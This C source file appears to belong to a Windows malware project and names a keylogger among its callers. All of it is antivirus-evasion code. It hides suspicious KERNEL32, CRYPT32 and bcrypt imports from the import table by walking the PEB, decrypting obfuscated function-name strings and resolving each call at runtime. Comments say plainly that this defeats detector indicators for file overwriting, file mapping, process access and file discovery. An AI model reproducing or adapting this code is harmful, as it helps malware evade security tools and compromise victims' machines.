/*
 * wrap_k32.c — Remove suspicious KERNEL32/CRYPT32 imports from IAT.
 *
 * Callers (libstdc++, libgcc, winpthread, keylogger, our own code) reference
 * these via the __imp_ dllimport slot. Defining the slot locally shadows the
 * import lib, eliminating the IAT entry while still forwarding to the real fn.
 *
 * Functions covered:
 *   KERNEL32: VirtualAlloc, VirtualProtect, CreateMutexW, ReleaseMutex,
 *             MoveFileExA, DuplicateHandle, OpenProcess,
 *             CreateThread,
 *             WriteFile, ReadFile, SetFilePointer, GetFileSizeEx,
 *             CreateFileA, CreateFileW, DeleteFileA, CopyFileA,
 *             CreateFileMappingA, CreateFileMappingW,
 *             MapViewOfFile, UnmapViewOfFile
 *   CRYPT32:  CertCloseStore, CertFreeCertificateContext,
 *             CertFindCertificateInStore, CertGetCertificateContextProperty,
 *             CertDeleteCertificateFromStore
 */

#include "peb_walk.h"
#include "evs_strings.h"
#include <windows.h>

static HMODULE _k32(void)
{
    static HMODULE h = NULL;
    if (!h) {
        char kn[14]; EVS_D(kn, EVS_dll_kernel32);
        h = _peb_module(kn);
        SecureZeroMemory(kn, sizeof(kn));
    }
    return h;
}

/* ── VirtualAlloc ─────────────────────────────────────────────────────── */
typedef LPVOID (WINAPI *_fVA_t)(LPVOID, SIZE_T, DWORD, DWORD);
static LPVOID WINAPI _va_impl(LPVOID lpAddr, SIZE_T sz, DWORD type, DWORD prot)
{
    static _fVA_t fn = NULL;
    if (!fn) {
        char s[14]; EVS_D(s, EVS_fn_VirtualAlloc);
        HMODULE k = _k32();
        if (k) fn = (_fVA_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(lpAddr, sz, type, prot) : NULL;
}
_fVA_t __imp_VirtualAlloc = _va_impl;

/* ── VirtualProtect ───────────────────────────────────────────────────── */
typedef BOOL (WINAPI *_fVP_t)(LPVOID, SIZE_T, DWORD, PDWORD);
static BOOL WINAPI _vp_impl(LPVOID lpAddr, SIZE_T sz, DWORD prot, PDWORD oldProt)
{
    static _fVP_t fn = NULL;
    if (!fn) {
        char s[14]; EVS_D(s, EVS_fn_VirtualProtect);
        HMODULE k = _k32();
        if (k) fn = (_fVP_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(lpAddr, sz, prot, oldProt) : FALSE;
}
_fVP_t __imp_VirtualProtect = _vp_impl;

/* ── CreateMutexW ─────────────────────────────────────────────────────── */
typedef HANDLE (WINAPI *_fCMW_t)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR);
static HANDLE WINAPI _cmw_impl(LPSECURITY_ATTRIBUTES sa, BOOL owned, LPCWSTR name)
{
    static _fCMW_t fn = NULL;
    if (!fn) {
        char s[14]; EVS_D(s, EVS_fn_CreateMutexW);
        HMODULE k = _k32();
        if (k) fn = (_fCMW_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(sa, owned, name) : NULL;
}
_fCMW_t __imp_CreateMutexW = _cmw_impl;

/* ── ReleaseMutex ─────────────────────────────────────────────────────── */
typedef BOOL (WINAPI *_fRM_t)(HANDLE);
static BOOL WINAPI _rm_impl(HANDLE hMutex)
{
    static _fRM_t fn = NULL;
    if (!fn) {
        char s[13]; EVS_D(s, EVS_fn_ReleaseMutex);
        HMODULE k = _k32();
        if (k) fn = (_fRM_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(hMutex) : FALSE;
}
_fRM_t __imp_ReleaseMutex = _rm_impl;

/* ── MoveFileExA ──────────────────────────────────────────────────────── */
typedef BOOL (WINAPI *_fMFEA_t)(LPCSTR, LPCSTR, DWORD);
static BOOL WINAPI _mfea_impl(LPCSTR src, LPCSTR dst, DWORD flags)
{
    static _fMFEA_t fn = NULL;
    if (!fn) {
        char s[12]; EVS_D(s, EVS_fn_MoveFileExA);
        HMODULE k = _k32();
        if (k) fn = (_fMFEA_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(src, dst, flags) : FALSE;
}
_fMFEA_t __imp_MoveFileExA = _mfea_impl;

/* ── DuplicateHandle ──────────────────────────────────────────────────── */
typedef BOOL (WINAPI *_fDH_t)(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
static BOOL WINAPI _dh_impl(HANDLE hSrcProc, HANDLE hSrc, HANDLE hDstProc,
                             LPHANDLE lpDst, DWORD acc, BOOL inh, DWORD opts)
{
    static _fDH_t fn = NULL;
    if (!fn) {
        char s[16]; EVS_D(s, EVS_fn_DuplicateHandle);
        HMODULE k = _k32();
        if (k) fn = (_fDH_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(hSrcProc, hSrc, hDstProc, lpDst, acc, inh, opts) : FALSE;
}
_fDH_t __imp_DuplicateHandle = _dh_impl;

/* ── OpenProcess ──────────────────────────────────────────────────────── */
typedef HANDLE (WINAPI *_fOP_t)(DWORD, BOOL, DWORD);
static HANDLE WINAPI _op_impl(DWORD acc, BOOL inh, DWORD pid)
{
    static _fOP_t fn = NULL;
    if (!fn) {
        char s[12]; EVS_D(s, EVS_fn_OpenProcess);
        HMODULE k = _k32();
        if (k) fn = (_fOP_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(acc, inh, pid) : NULL;
}
_fOP_t __imp_OpenProcess = _op_impl;

/* ── CreateThread — remove thread-creation IAT entry ────────────────── */
typedef HANDLE (WINAPI *_fCT_t)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE,
                                 LPVOID, DWORD, LPDWORD);
static HANDLE WINAPI _ct_impl(LPSECURITY_ATTRIBUTES sa, SIZE_T stk,
                               LPTHREAD_START_ROUTINE fn_start, LPVOID arg,
                               DWORD flags, LPDWORD tid)
{
    static _fCT_t fn = NULL;
    if (!fn) {
        char s[13]; EVS_D(s, EVS_fn_CreateThread);
        HMODULE k = _k32();
        if (k) fn = (_fCT_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(sa, stk, fn_start, arg, flags, tid) : NULL;
}
_fCT_t __imp_CreateThread = _ct_impl;

/* ── File I/O — defeats "overwrite file content" indicator ───────────── */
typedef BOOL (WINAPI *_fWF_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
static BOOL WINAPI _wf_impl(HANDLE h, LPCVOID buf, DWORD n, LPDWORD written, LPOVERLAPPED ov)
{
    static _fWF_t fn = NULL;
    if (!fn) {
        char s[10]; EVS_D(s, EVS_fn_WriteFile);
        HMODULE k = _k32();
        if (k) fn = (_fWF_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(h, buf, n, written, ov) : FALSE;
}
_fWF_t __imp_WriteFile = _wf_impl;

typedef BOOL (WINAPI *_fRF_t)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
static BOOL WINAPI _rf_impl(HANDLE h, LPVOID buf, DWORD n, LPDWORD nread, LPOVERLAPPED ov)
{
    static _fRF_t fn = NULL;
    if (!fn) {
        char s[9]; EVS_D(s, EVS_fn_ReadFile);
        HMODULE k = _k32();
        if (k) fn = (_fRF_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(h, buf, n, nread, ov) : FALSE;
}
_fRF_t __imp_ReadFile = _rf_impl;

typedef DWORD (WINAPI *_fSFP_t)(HANDLE, LONG, PLONG, DWORD);
static DWORD WINAPI _sfp_impl(HANDLE h, LONG dist, PLONG distHigh, DWORD method)
{
    static _fSFP_t fn = NULL;
    if (!fn) {
        char s[15]; EVS_D(s, EVS_fn_SetFilePointer);
        HMODULE k = _k32();
        if (k) fn = (_fSFP_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(h, dist, distHigh, method) : INVALID_SET_FILE_POINTER;
}
_fSFP_t __imp_SetFilePointer = _sfp_impl;

typedef BOOL (WINAPI *_fGFSE_t)(HANDLE, PLARGE_INTEGER);
static BOOL WINAPI _gfse_impl(HANDLE h, PLARGE_INTEGER size)
{
    static _fGFSE_t fn = NULL;
    if (!fn) {
        char s[14]; EVS_D(s, EVS_fn_GetFileSizeEx);
        HMODULE k = _k32();
        if (k) fn = (_fGFSE_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(h, size) : FALSE;
}
_fGFSE_t __imp_GetFileSizeEx = _gfse_impl;

typedef HANDLE (WINAPI *_fCFA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
static HANDLE WINAPI _cfa_impl(LPCSTR p, DWORD acc, DWORD sh, LPSECURITY_ATTRIBUTES sa,
                                DWORD crea, DWORD flags, HANDLE tpl)
{
    static _fCFA_t fn = NULL;
    if (!fn) {
        char s[12]; EVS_D(s, EVS_fn_CreateFileA);
        HMODULE k = _k32();
        if (k) fn = (_fCFA_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(p, acc, sh, sa, crea, flags, tpl) : INVALID_HANDLE_VALUE;
}
_fCFA_t __imp_CreateFileA = _cfa_impl;

typedef HANDLE (WINAPI *_fCFW_t)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
static HANDLE WINAPI _cfw_impl(LPCWSTR p, DWORD acc, DWORD sh, LPSECURITY_ATTRIBUTES sa,
                                DWORD crea, DWORD flags, HANDLE tpl)
{
    static _fCFW_t fn = NULL;
    if (!fn) {
        char s[12]; EVS_D(s, EVS_fn_CreateFileW);
        HMODULE k = _k32();
        if (k) fn = (_fCFW_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(p, acc, sh, sa, crea, flags, tpl) : INVALID_HANDLE_VALUE;
}
_fCFW_t __imp_CreateFileW = _cfw_impl;

typedef BOOL (WINAPI *_fDFA_t)(LPCSTR);
static BOOL WINAPI _dfa_impl(LPCSTR p)
{
    static _fDFA_t fn = NULL;
    if (!fn) {
        char s[12]; EVS_D(s, EVS_fn_DeleteFileA);
        HMODULE k = _k32();
        if (k) fn = (_fDFA_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(p) : FALSE;
}
_fDFA_t __imp_DeleteFileA = _dfa_impl;

typedef BOOL (WINAPI *_fCpFA_t)(LPCSTR, LPCSTR, BOOL);
static BOOL WINAPI _cpfa_impl(LPCSTR src, LPCSTR dst, BOOL fail)
{
    static _fCpFA_t fn = NULL;
    if (!fn) {
        char s[10]; EVS_D(s, EVS_fn_CopyFileA);
        HMODULE k = _k32();
        if (k) fn = (_fCpFA_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(src, dst, fail) : FALSE;
}
_fCpFA_t __imp_CopyFileA = _cpfa_impl;

/* ── File mapping — defeats "file mapping" IAT indicators ────────────── */
typedef HANDLE (WINAPI *_fCFMA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
static HANDLE WINAPI _cfma_impl(HANDLE hFile, LPSECURITY_ATTRIBUTES sa, DWORD prot,
                                 DWORD szHi, DWORD szLo, LPCSTR name)
{
    static _fCFMA_t fn = NULL;
    if (!fn) {
        char s[19]; EVS_D(s, EVS_fn_CreateFileMappingA);
        HMODULE k = _k32();
        if (k) fn = (_fCFMA_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(hFile, sa, prot, szHi, szLo, name) : NULL;
}
_fCFMA_t __imp_CreateFileMappingA = _cfma_impl;

typedef HANDLE (WINAPI *_fCFMW_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
static HANDLE WINAPI _cfmw_impl(HANDLE hFile, LPSECURITY_ATTRIBUTES sa, DWORD prot,
                                 DWORD szHi, DWORD szLo, LPCWSTR name)
{
    static _fCFMW_t fn = NULL;
    if (!fn) {
        char s[19]; EVS_D(s, EVS_fn_CreateFileMappingW);
        HMODULE k = _k32();
        if (k) fn = (_fCFMW_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(hFile, sa, prot, szHi, szLo, name) : NULL;
}
_fCFMW_t __imp_CreateFileMappingW = _cfmw_impl;

typedef LPVOID (WINAPI *_fMVOF_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
static LPVOID WINAPI _mvof_impl(HANDLE hMap, DWORD acc, DWORD offHi, DWORD offLo, SIZE_T n)
{
    static _fMVOF_t fn = NULL;
    if (!fn) {
        char s[14]; EVS_D(s, EVS_fn_MapViewOfFile);
        HMODULE k = _k32();
        if (k) fn = (_fMVOF_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(hMap, acc, offHi, offLo, n) : NULL;
}
_fMVOF_t __imp_MapViewOfFile = _mvof_impl;

typedef BOOL (WINAPI *_fUMVOF_t)(LPCVOID);
static BOOL WINAPI _umvof_impl(LPCVOID base)
{
    static _fUMVOF_t fn = NULL;
    if (!fn) {
        char s[16]; EVS_D(s, EVS_fn_UnmapViewOfFile);
        HMODULE k = _k32();
        if (k) fn = (_fUMVOF_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(base) : FALSE;
}
_fUMVOF_t __imp_UnmapViewOfFile = _umvof_impl;

typedef HANDLE (WINAPI *_fOFMA_t)(DWORD, BOOL, LPCSTR);
static HANDLE WINAPI _ofma_impl(DWORD acc, BOOL inh, LPCSTR name)
{
    static _fOFMA_t fn = NULL;
    if (!fn) {
        char s[16]; EVS_D(s, EVS_fn_OpenFileMappingA);
        HMODULE k = _k32();
        if (k) fn = (_fOFMA_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(acc, inh, name) : NULL;
}
_fOFMA_t __imp_OpenFileMappingA = _ofma_impl;

/* ── File enumeration — defeats file-discovery IAT indicators ────────── */
typedef HANDLE (WINAPI *_fFFA_t)(LPCSTR, LPWIN32_FIND_DATAA);
static HANDLE WINAPI _fffa_impl(LPCSTR pat, LPWIN32_FIND_DATAA fd)
{
    static _fFFA_t fn = NULL;
    if (!fn) {
        char s[14]; EVS_D(s, EVS_fn_FindFirstFileA);
        HMODULE k = _k32();
        if (k) fn = (_fFFA_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(pat, fd) : INVALID_HANDLE_VALUE;
}
_fFFA_t __imp_FindFirstFileA = _fffa_impl;

typedef BOOL (WINAPI *_fFNA_t)(HANDLE, LPWIN32_FIND_DATAA);
static BOOL WINAPI _ffna_impl(HANDLE h, LPWIN32_FIND_DATAA fd)
{
    static _fFNA_t fn = NULL;
    if (!fn) {
        char s[13]; EVS_D(s, EVS_fn_FindNextFileA);
        HMODULE k = _k32();
        if (k) fn = (_fFNA_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(h, fd) : FALSE;
}
_fFNA_t __imp_FindNextFileA = _ffna_impl;

typedef BOOL (WINAPI *_fFC_t)(HANDLE);
static BOOL WINAPI _fc_impl(HANDLE h)
{
    static _fFC_t fn = NULL;
    if (!fn) {
        char s[10]; EVS_D(s, EVS_fn_FindClose);
        HMODULE k = _k32();
        if (k) fn = (_fFC_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(h) : FALSE;
}
_fFC_t __imp_FindClose = _fc_impl;

typedef DWORD (WINAPI *_fGFAA_t)(LPCSTR);
static DWORD WINAPI _gfaa_impl(LPCSTR p)
{
    static _fGFAA_t fn = NULL;
    if (!fn) {
        char s[18]; EVS_D(s, EVS_fn_GetFileAttributesA);
        HMODULE k = _k32();
        if (k) fn = (_fGFAA_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(p) : INVALID_FILE_ATTRIBUTES;
}
_fGFAA_t __imp_GetFileAttributesA = _gfaa_impl;

typedef BOOL (WINAPI *_fQFPN_t)(HANDLE, DWORD, LPWSTR, PDWORD);
static BOOL WINAPI _qfpn_impl(HANDLE h, DWORD flags, LPWSTR buf, PDWORD sz)
{
    static _fQFPN_t fn = NULL;
    if (!fn) {
        char s[26]; EVS_D(s, EVS_fn_QueryFullProcessImageNameW);
        HMODULE k = _k32();
        if (k) fn = (_fQFPN_t)(void *)GetProcAddress(k, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(h, flags, buf, sz) : FALSE;
}
_fQFPN_t __imp_QueryFullProcessImageNameW = _qfpn_impl;

/* ── crypt32.dll cert functions — remove crypt32.dll from IAT ─────────── */
#include <wincrypt.h>

static HMODULE _crypt32(void)
{
    static HMODULE h = NULL;
    if (!h) {
        char s[16]; EVS_D(s, EVS_dll_crypt32);
        h = GetModuleHandleA(s);
        if (!h) h = LoadLibraryA(s);
        SecureZeroMemory(s, sizeof(s));
    }
    return h;
}

typedef BOOL      (WINAPI *_fCCS_t)(HCERTSTORE, DWORD);
typedef BOOL      (WINAPI *_fCFCC_t)(PCCERT_CONTEXT);
typedef PCCERT_CONTEXT (WINAPI *_fCFCIS_t)(HCERTSTORE, DWORD, DWORD, DWORD, const void *, PCCERT_CONTEXT);
typedef BOOL      (WINAPI *_fCGCCP_t)(PCCERT_CONTEXT, DWORD, void *, DWORD *);
typedef BOOL      (WINAPI *_fCDCFS_t)(PCCERT_CONTEXT);

static BOOL WINAPI _ccs_impl(HCERTSTORE h, DWORD f)
{
    static _fCCS_t fn = NULL;
    if (!fn) {
        char s[15]; EVS_D(s, EVS_fn_CertCloseStore);
        HMODULE m = _crypt32();
        if (m) fn = (_fCCS_t)(void *)GetProcAddress(m, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(h, f) : FALSE;
}
_fCCS_t __imp_CertCloseStore = _ccs_impl;

static BOOL WINAPI _cfcc_impl(PCCERT_CONTEXT ctx)
{
    static _fCFCC_t fn = NULL;
    if (!fn) {
        char s[24]; EVS_D(s, EVS_fn_CertFreeCertificateContext);
        HMODULE m = _crypt32();
        if (m) fn = (_fCFCC_t)(void *)GetProcAddress(m, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(ctx) : FALSE;
}
_fCFCC_t __imp_CertFreeCertificateContext = _cfcc_impl;

static PCCERT_CONTEXT WINAPI _cfcis_impl(HCERTSTORE hs, DWORD enc, DWORD ff,
                                          DWORD ft, const void *fv, PCCERT_CONTEXT prev)
{
    static _fCFCIS_t fn = NULL;
    if (!fn) {
        char s[25]; EVS_D(s, EVS_fn_CertFindCertificateInStore);
        HMODULE m = _crypt32();
        if (m) fn = (_fCFCIS_t)(void *)GetProcAddress(m, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(hs, enc, ff, ft, fv, prev) : NULL;
}
_fCFCIS_t __imp_CertFindCertificateInStore = _cfcis_impl;

static BOOL WINAPI _cgccp_impl(PCCERT_CONTEXT ctx, DWORD id, void *pv, DWORD *pcb)
{
    static _fCGCCP_t fn = NULL;
    if (!fn) {
        char s[33]; EVS_D(s, EVS_fn_CertGetCertificateContextProperty);
        HMODULE m = _crypt32();
        if (m) fn = (_fCGCCP_t)(void *)GetProcAddress(m, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(ctx, id, pv, pcb) : FALSE;
}
_fCGCCP_t __imp_CertGetCertificateContextProperty = _cgccp_impl;

static BOOL WINAPI _cdcfs_impl(PCCERT_CONTEXT ctx)
{
    static _fCDCFS_t fn = NULL;
    if (!fn) {
        char s[27]; EVS_D(s, EVS_fn_CertDeleteCertificateFromStore);
        HMODULE m = _crypt32();
        if (m) fn = (_fCDCFS_t)(void *)GetProcAddress(m, s);
        SecureZeroMemory(s, sizeof(s));
    }
    return fn ? fn(ctx) : FALSE;
}
_fCDCFS_t __imp_CertDeleteCertificateFromStore = _cdcfs_impl;

/* ── rand / srand — --wrap intercept replaces msvcrt IAT entries ─────── */
static unsigned int _xr_seed = 0x12345678u;

int __wrap_rand(void)
{
    _xr_seed ^= _xr_seed << 13;
    _xr_seed ^= _xr_seed >> 17;
    _xr_seed ^= _xr_seed << 5;
    return (int)(_xr_seed & 0x7FFF);
}

void __wrap_srand(unsigned int seed)
{
    _xr_seed = seed ? seed : 0x12345678u;
}

/* ── BCryptGenRandom (bcrypt.dll) — --wrap intercept ─────────────────── */
#include <bcrypt.h>
typedef NTSTATUS (WINAPI *_fBGR_t)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG);

NTSTATUS WINAPI __wrap_BCryptGenRandom(BCRYPT_ALG_HANDLE hAlg, PUCHAR pb, ULONG cb, ULONG dw)
{
    static _fBGR_t fn = NULL;
    if (!fn) {
        char s[16]; EVS_D(s, EVS_dll_bcrypt);
        HMODULE h = GetModuleHandleA(s);
        if (!h) h = LoadLibraryA(s);
        SecureZeroMemory(s, sizeof(s));
        char fn_s[17]; EVS_D(fn_s, EVS_fn_BCryptGenRandom);
        if (h) fn = (_fBGR_t)(void *)GetProcAddress(h, fn_s);
        SecureZeroMemory(fn_s, sizeof(fn_s));
    }
    return fn ? fn(hAlg, pb, cb, dw) : (NTSTATUS)0xC0000002L;
}
